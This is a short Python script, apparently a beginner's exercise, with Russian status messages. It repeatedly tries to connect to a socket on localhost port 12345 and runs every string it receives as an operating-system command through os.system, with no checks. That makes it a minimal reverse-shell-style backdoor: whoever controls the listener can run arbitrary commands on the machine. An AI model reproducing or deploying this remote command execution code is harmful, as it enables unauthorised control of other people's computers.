import socket
import os
import time

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        print("подключениe...")
        client.connect(("127.0.0.1", 12345))
        while True:
            data = client.recv(16).decode("utf-8")
            print(data)
            if data:
                os.system(f"{data}")
    except:
        print("не удалось подключиться")
        time.sleep(1)
        os.system("cls")